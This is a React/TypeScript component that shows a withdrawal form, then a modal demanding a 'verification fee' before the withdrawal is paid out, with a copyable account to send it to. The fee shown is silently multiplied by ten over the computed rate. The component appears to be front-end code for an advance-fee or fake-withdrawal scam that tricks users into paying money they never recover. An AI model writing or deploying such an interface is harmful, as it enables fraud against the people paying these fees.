import React, { useState } from 'react';
import { Form, Button, Alert, Modal } from 'react-bootstrap';

interface WithdrawalPromptProps {
  account: string;
  verificationFeeRate: number;
  accountType: string;
}

const WithdrawalPrompt: React.FC<WithdrawalPromptProps> = ({ accountType, account, verificationFeeRate }) => {
  const [withdrawalAmount, setWithdrawalAmount] = useState<number | null>(null);
  const [verificationFee, setVerificationFee] = useState<number | null>(null);
  const [showVerification, setShowVerification] = useState(false);

  const handleWithdrawAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const amount = parseFloat(e.target.value);
    setWithdrawalAmount(amount);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (withdrawalAmount && withdrawalAmount > 0) {
      const fee = (withdrawalAmount * verificationFeeRate) / 100;
      setVerificationFee(fee);
      setShowVerification(true);
    }
  };

  const handleCloseModal = () => setShowVerification(false);

  const handleCopyToClipboard = () => {
    navigator.clipboard.writeText(account);
    alert("Account number copied to clipboard!");
  };

  return (
    <>
      <Form onSubmit={handleSubmit}>
        <Form.Group controlId="withdrawAmount">
          <Form.Label>Enter Withdrawal Amount in USD</Form.Label>
          <Form.Control
            type="number"
            placeholder="Enter amount"
            value={withdrawalAmount || ''}
            onChange={handleWithdrawAmountChange}
            required
          />
        </Form.Group>
        <br/>
        <div className="d-flex justify-content-center">
          <Button variant="primary" type="submit">
            Submit
          </Button>
        </div>
      </Form>

      <Modal show={showVerification} onHide={handleCloseModal}>
        <Modal.Header closeButton>
          <Modal.Title>Verification Fee Required</Modal.Title>
        </Modal.Header>
        <Modal.Body>
          {verificationFee !== null && (
            <>
              <Alert variant="info">
                A verification fee of <strong>${verificationFee *10}</strong> is required for this transaction.
              </Alert>
              <Alert variant="info">
                If the verification fee payment has been confirmed, the amount you wish to withdraw {`($${withdrawalAmount})`} will be deposited in your account.
              </Alert>
              <Alert variant="warning" className="d-flex flex-column align-items-start">
                <div style={{ wordBreak: 'break-word' }}>
                  Please pay the verification fee using {`${accountType}`} to the following account:
                </div>
                <div className="mt-2 d-flex align-items-center">
                  <strong className="me-2" style={{ wordBreak: 'break-all' }}>{account}</strong>
                  <Button variant="outline-secondary" size="sm" onClick={handleCopyToClipboard}>
                    Copy
                  </Button>
                </div>
              </Alert>
              <Alert variant="info">
                In case of confusion, kindly contact support.
              </Alert>
            </>
          )}
        </Modal.Body>
        <Modal.Footer>
          <Button variant="secondary" onClick={handleCloseModal}>
            Close
          </Button>
        </Modal.Footer>
      </Modal>
    </>
  );
};

export default WithdrawalPrompt;
